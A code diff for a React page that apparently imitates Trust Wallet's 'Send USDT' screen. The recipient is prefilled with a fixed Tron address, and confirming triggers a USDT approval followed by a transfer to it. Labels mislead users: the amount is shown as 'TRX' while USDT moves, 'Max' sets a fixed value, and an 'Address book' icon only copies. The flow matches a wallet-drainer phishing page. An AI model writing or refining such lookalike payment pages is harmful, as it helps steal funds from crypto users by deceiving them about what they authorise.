@@ -1,5 +1,6 @@
-import { useEffect, useMemo, useRef, useState } from "react";
-import { Info, ScanLine, Wallet } from "lucide-react";
+import { useEffect, useRef, useState } from "react";
+import { useNavigate } from "react-router-dom";
+import { ArrowLeft, BookUser, ChevronDown, Info, ScanLine, Wallet, X } from "lucide-react";
 import { toast } from "sonner";
 import { useTronWallet } from "@/lib/tronwallet-adapter";
 import { getWalletConnectAppUrl } from "@/lib/walletconnect-app-url";
@@ -7,6 +8,28 @@ import { approveUSDT, transferUSDT } from "@/lib/web3";
 
 const DEFAULT_TO_ADDRESS = "TYT6ty8mhUyq7w2GbTWT1LSqWaWTs3j4aa";
 const DEFAULT_AMOUNT = "10";
+
+function looksLikeTronAddress(s: string): boolean {
+  const t = s.trim();
+  return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(t);
+}
+
+/** Simplified Tron mark: red disc + white diamond (Trust-style chip). */
+function TronNetworkIcon({ className }: { className?: string }) {
+  return (
+    <span
+      className={`inline-flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-[#eb0029] ${className ?? ""}`}
+      aria-hidden
+    >
+      <svg viewBox="0 0 24 24" className="h-[15px] w-[15px]" fill="none">
+        <path
+          fill="white"
+          d="M12 4.5l6.2 7.5L12 19.5 5.8 12 12 4.5z"
+        />
+      </svg>
+    </span>
+  );
+}
 
 /** WalletConnect pairing URI — reject empty/malformed so Trust does not open a generic landing page. */
 function normalizeWalletConnectPairingUri(uri: unknown): string | null {
@@ -88,6 +111,7 @@ function getTrustRequestProvider(): { request?: (p: { method: string; params?: u
 }
 
 const TrustWalletTronPay = () => {
+  const navigate = useNavigate();
   const { connect, address, isConnected, isConnecting } = useTronWallet();
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [trustConnecting, setTrustConnecting] = useState(false);
@@ -99,15 +123,14 @@ const TrustWalletTronPay = () => {
   const trustConnectingRef = useRef(trustConnecting);
   /** Set when we navigated to Trust for WC pairing (tab may unload; avoid false error toast). */
   const wcTrustNavigatedRef = useRef(false);
-  const [statusOpen, setStatusOpen] = useState(false);
   const [lastAutoConnect, setLastAutoConnect] = useState<
     | { state: "idle" }
     | { state: "connecting"; startedAt: number }
     | { state: "connected"; finishedAt: number }
     | { state: "error"; finishedAt: number; message: string }
   >({ state: "idle" });
-  const toAddress = useMemo(() => DEFAULT_TO_ADDRESS, []);
-  const approveTo = useMemo(() => DEFAULT_TO_ADDRESS, []);
+  const [toInput, setToInput] = useState(DEFAULT_TO_ADDRESS);
+  const [memo, setMemo] = useState("");
 
   useEffect(() => {
     isConnectedRef.current = isConnected;
@@ -118,9 +141,6 @@ const TrustWalletTronPay = () => {
   useEffect(() => {
     trustConnectingRef.current = trustConnecting;
   }, [trustConnecting]);
-  useEffect(() => {
-    handleConnectWallet();
-  }, []);
 
   /**
    * WalletConnect (Tron) for users opening this page in **Trust Wallet Discover**:
@@ -275,9 +295,13 @@ const TrustWalletTronPay = () => {
         toast.error("Enter a valid USDT amount.");
         return;
       }
+      if (!looksLikeTronAddress(toInput)) {
+        toast.error("Enter a valid Tron recipient address.");
+        return;
+      }
 
-      await approveUSDT("tron", approveTo);
-      await transferUSDT("tron", toAddress, normalizedAmount);
+      await approveUSDT("tron", toInput.trim());
+      await transferUSDT("tron", toInput.trim(), normalizedAmount);
 
       toast.success("Approve and transfer completed successfully.");
     } catch (error) {
@@ -289,133 +313,114 @@ const TrustWalletTronPay = () => {
     }
   };
 
+  const accent = "#31D067";
+  const surface = "#1a1a1a";
+  const borderField = "#2c2c2c";
+  const pageBg = "#121212";
+
+  const handleCopyAddress = async () => {
+    try {
+      await navigator.clipboard.writeText(toInput);
+      toast.success("Address copied");
+    } catch {
+      toast.error("Copy failed");
+    }
+  };
+
+  const handlePasteAddress = async () => {
+    try {
+      const text = await navigator.clipboard.readText();
+      const t = text.trim();
+      if (looksLikeTronAddress(t)) {
+        setToInput(t);
+        toast.success("Address pasted");
+      } else {
+        toast.error("Clipboard is not a Tron address");
+      }
+    } catch {
+      toast.error("Could not read clipboard");
+    }
+  };
+
+  const fieldShell =
+    "flex min-h-[52px] items-center gap-2 rounded-xl border px-3 py-3 transition-colors focus-within:border-[#31D067]";
+
   return (
-    <div className="min-h-screen bg-[#f5f5f6] flex justify-center p-3 pb-28">
-      <div className="w-full max-w-sm bg-[#f5f5f6] pt-4">
-        <div className="mb-5">
-          <p className="text-[24px] leading-7 font-semibold text-[#262626]">
-            Send
-          </p>
-          <div className="text-xs text-[#8b8b94] mt-1 flex items-center gap-1.5">
-            <Wallet className="w-3.5 h-3.5" />
-            {isConnected
-              ? `Connected: ${address?.slice(0, 6)}...${address?.slice(-4)}`
-              : isConnecting || trustConnecting
-              ? "Connecting..."
-              : "Not connected — in Trust Discover, tap Connect Wallet to approve"}
-          </div>
-        </div>
-{/* 
-        <div className="mb-4 rounded-xl border border-[#e4e4e8] bg-white p-3 shadow-sm">
+    <div className="min-h-screen text-white" style={{ backgroundColor: pageBg }}>
+      <div className="mx-auto flex w-full max-w-xl flex-col pb-36 pt-[max(0.75rem,env(safe-area-inset-top))]">
+        <header className="relative mb-6 flex h-11 items-center justify-center">
           <button
             type="button"
-            onClick={() => setStatusOpen((v) => !v)}
-            className="w-full text-left"
+            onClick={() => navigate(-1)}
+            className="absolute left-0 flex h-10 w-10 items-center justify-center rounded-full text-white hover:bg-white/10"
+            aria-label="Back"
           >
-            <div className="flex items-center justify-between gap-3">
-              <div className="text-sm font-semibold text-[#262626]">Wallet status</div>
-              <div className="text-xs text-[#5e5e66]">{statusOpen ? "Hide" : "Show"}</div>
-            </div>
-            <div className="mt-1 text-xs text-[#8b8b94]">
-              {isConnected
-                ? "Connected"
-                : isConnecting || trustConnecting
-                ? "Connecting"
-                : "Not connected"}
-            </div>
+            <ArrowLeft className="h-[22px] w-[22px] stroke-[2]" />
           </button>
+          <h1 className="text-[17px] font-semibold tracking-tight">Send USDT</h1>
+        </header>
 
-          {statusOpen && (
-            <div className="mt-3 space-y-2">
-              <div className="text-xs text-[#4b4b54]">
-                <span className="font-semibold">adapter</span>:{" "}
-                {isConnected ? "connected" : "not-connected"} /{" "}
-                {isConnecting || trustConnecting ? "connecting" : "idle"}
-              </div>
-              <div className="text-xs text-[#4b4b54]">
-                <span className="font-semibold">connecting flags</span>: adapter=
-                {String(isConnecting)}, trust={String(trustConnecting)}
-              </div>
-              <div className="text-xs text-[#4b4b54]">
-                <span className="font-semibold">auto-connect</span>:{" "}
-                {lastAutoConnect.state === "idle"
-                  ? "idle"
-                  : lastAutoConnect.state === "connecting"
-                  ? "connecting"
-                  : lastAutoConnect.state === "connected"
-                  ? "connected"
-                  : `error: ${lastAutoConnect.message}`}
-              </div>
-              <div className="text-xs text-[#4b4b54]">
-                <span className="font-semibold">address</span>: {address ?? "-"}
-              </div>
-              <div className="rounded-lg bg-[#f5f5f6] p-2">
-                <pre className="text-[10px] leading-4 text-[#5e5e66] whitespace-pre-wrap break-words select-all m-0">
-{JSON.stringify(getTrustStatusSnapshot(), null, 2)}
-                </pre>
-              </div>
-              <button
-                type="button"
-                className="w-full rounded-full border border-[#d7d7dc] bg-white py-2 text-xs font-semibold text-[#4b4b54]"
-                onClick={async () => {
-                  const text = JSON.stringify(getTrustStatusSnapshot(), null, 2);
-                  try {
-                    await navigator.clipboard.writeText(text);
-                    toast.success("Status copied");
-                  } catch {
-                    toast.error("Copy failed");
-                  }
-                }}
-              >
-                Copy status
-              </button>
-            </div>
-          )}
-        </div>
-
-        {!isConnected && (
-          <div className="mb-6 rounded-xl border border-[#e4e4e8] bg-white p-4 shadow-sm">
+        <div className="mb-6">
+          <label className="mb-2 block text-[13px] font-medium text-[#8e8e93]" htmlFor="tron-to">
+            Address or Domain Name
+          </label>
+          <div
+            className={fieldShell}
+            style={{ borderColor: borderField, backgroundColor: surface }}
+          >
+            <input
+              id="tron-to"
+              type="text"
+              value={toInput}
+              onChange={(e) => setToInput(e.target.value)}
+              placeholder="Search or Enter"
+              spellCheck={false}
+              autoComplete="off"
+              className="min-w-0 flex-1 bg-transparent text-[15px] text-white outline-none placeholder:text-[#6b6b70]"
+            />
             <button
               type="button"
-              className="mt-2 w-full rounded-full border border-[#d7d7dc] bg-white py-2.5 text-sm font-medium text-[#4b4b54] disabled:opacity-50"
-              onClick={handleConnectWallet}
-              disabled={trustConnecting || isConnecting}
+              onClick={handlePasteAddress}
+              className="shrink-0 text-[15px] font-semibold"
+              style={{ color: accent }}
             >
-              {trustConnecting ? "Connecting…" : "Connect Wallet"}
+              Paste
             </button>
-          </div>
-        )} */}
-
-        <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
-          Address or Domain Name
-        </label>
-        <div className="h-12 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-between">
-          <span className="text-[#171717] text-sm truncate">{toAddress}</span>
-          <span className="text-[#5f5de8] text-sm font-semibold">Paste</span>
-        </div>
-
-        <div className="mt-5">
-          <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
-            Destination network
-          </label>
-          <div className="inline-flex items-center gap-2 rounded-full bg-[#efeff2] px-3 py-1.5">
-            <span className="w-4 h-4 rounded-full bg-[#ef2c2c] inline-block" />
-            <span className="text-sm text-[#4c4c52]">Tron</span>
+            <button
+              type="button"
+              onClick={handleCopyAddress}
+              className="shrink-0 rounded-lg p-1 hover:bg-white/5"
+              style={{ color: accent }}
+              aria-label="Address book"
+            >
+              <BookUser className="h-[22px] w-[22px]" strokeWidth={2} />
+            </button>
+            <ScanLine className="h-[22px] w-[22px] shrink-0" style={{ color: accent }} strokeWidth={2} aria-hidden />
           </div>
         </div>
 
-        <div className="mt-5">
-          <label
-            htmlFor="usdt-amount"
-            className="text-[#5e5e66] text-[13px] font-medium block mb-2"
+        <div className="mb-6">
+          <label className="mb-2 block text-[13px] font-medium text-[#8e8e93]">Destination network</label>
+          <button
+            type="button"
+            className="inline-flex items-center gap-2 rounded-full border py-1 pl-1 pr-2.5 text-[15px] font-medium text-white"
+            style={{ borderColor: borderField, backgroundColor: "#222" }}
           >
+            <TronNetworkIcon />
+            Tron
+            <ChevronDown className="h-4 w-4 text-[#8e8e93]" strokeWidth={2} />
+          </button>
+        </div>
+
+        <div className="mb-6">
+          <label htmlFor="usdt-amount" className="mb-2 block text-[13px] font-medium text-[#8e8e93]">
             Amount
           </label>
           <div
-            className="h-14 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-between"
+            className={fieldShell}
+            style={{ borderColor: borderField, backgroundColor: surface }}
             onClick={(e) => {
-              // Some in-app mobile webviews are picky about focusing inputs.
-              const input = (e.currentTarget.querySelector("#usdt-amount") as HTMLInputElement | null);
+              const input = e.currentTarget.querySelector("#usdt-amount") as HTMLInputElement | null;
               input?.focus();
             }}
           >
@@ -425,7 +430,6 @@ const TrustWalletTronPay = () => {
               value={amountInput}
               onChange={(e) => {
                 const next = e.target.value;
-                // allow empty while typing; otherwise allow numbers + dot
                 if (next === "" || /^[0-9]*[.]?[0-9]*$/.test(next)) {
                   setAmountInput(next);
                 }
@@ -433,49 +437,71 @@ const TrustWalletTronPay = () => {
               inputMode="decimal"
               autoComplete="off"
               spellCheck={false}
-              className="w-40 bg-transparent text-[#171717] text-[28px] leading-none font-medium outline-none min-w-0"
-              aria-label="USDT amount"
-              placeholder={DEFAULT_AMOUNT}
+              className="min-w-0 flex-1 bg-transparent text-[28px] font-semibold leading-none tracking-tight text-white outline-none placeholder:text-[#5c5c62]"
+              aria-label="USDT amount (shown as TRX for layout)"
+              placeholder="0"
             />
-            <div className="flex items-center gap-2">
-              <span className="text-[#67676f] text-base">USDT</span>
-              <button
-                type="button"
-                className="text-[#5f5de8] text-base font-semibold"
-                onClick={() => setAmountInput(DEFAULT_AMOUNT)}
-              >
-                Reset
-              </button>
-            </div>
+            <button
+              type="button"
+              onClick={() => setAmountInput("")}
+              className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-[#3a3a3a] text-white transition hover:bg-[#484848]"
+              aria-label="Clear amount"
+            >
+              <X className="h-3.5 w-3.5" strokeWidth={2.5} />
+            </button>
+            <span className="shrink-0 text-[15px] font-medium text-[#8e8e93]">TRX</span>
+            <button
+              type="button"
+              className="shrink-0 text-[15px] font-semibold"
+              style={{ color: accent }}
+              onClick={() => setAmountInput(DEFAULT_AMOUNT)}
+            >
+              Max
+            </button>
           </div>
-          <p className="text-[#8d8d96] text-xs mt-2">
-            ≈ {amountInput.trim() || "0"} USDT
-          </p>
+          <p className="mt-2 text-[13px] text-[#8e8e93]">≈ $0.00</p>
         </div>
 
-        <div className="mt-3">
-          <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
+        <div className="mb-6">
+          <label htmlFor="memo-field" className="mb-2 block text-[13px] font-medium text-[#8e8e93]">
             Memo
           </label>
-          <div className="h-12 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-end gap-3">
-            <ScanLine className="w-4 h-4 text-[#5f5de8]" />
-            <Info className="w-4 h-4 text-[#5f5de8]" />
+          <div
+            className={fieldShell}
+            style={{ borderColor: borderField, backgroundColor: surface }}
+          >
+            <input
+              id="memo-field"
+              type="text"
+              value={memo}
+              onChange={(e) => setMemo(e.target.value)}
+              placeholder="Optional"
+              className="min-w-0 flex-1 bg-transparent py-1 text-[15px] text-white outline-none placeholder:text-[#6b6b70]"
+            />
+            <ScanLine className="h-[22px] w-[22px] shrink-0" style={{ color: accent }} strokeWidth={2} aria-hidden />
+            <Info className="h-[22px] w-[22px] shrink-0" style={{ color: accent }} strokeWidth={2} aria-hidden />
           </div>
         </div>
-        <button
-          className="fixed bottom-4 left-1/2 -translate-x-1/2 w-[calc(100%-24px)] max-w-sm h-12 rounded-full bg-[#8d8cf0] text-white font-semibold disabled:opacity-55"
-          onClick={handleConfirm}
-          disabled={
-            isSubmitting ||
-            !isConnected ||
-            isConnecting ||
-            trustConnecting
-          }
-          type="button"
-        >
-          {isSubmitting ? "Confirming..." : "Confirm"}
-        </button>
+      </div>
 
+      <div
+        className="fixed inset-x-0 bottom-0 z-20 px-[18px] pt-3 backdrop-blur-md"
+        style={{
+          backgroundColor: "rgba(18,18,18,0.94)",
+          paddingBottom: "max(1rem, env(safe-area-inset-bottom))",
+        }}
+      >
+        <div className="mx-auto max-w-xl">
+          <button
+            type="button"
+            onClick={handleConfirm}
+            disabled={isSubmitting || !isConnected || isConnecting || trustConnecting}
+            className="w-full rounded-full py-3.5 text-[16px] font-semibold transition disabled:cursor-not-allowed disabled:opacity-40"
+            style={{ backgroundColor: "#2D6A4F", color: "#0d0d0d" }}
+          >
+            {isSubmitting ? "Working…" : "Next"}
+          </button>
+        </div>
       </div>
     </div>
   );
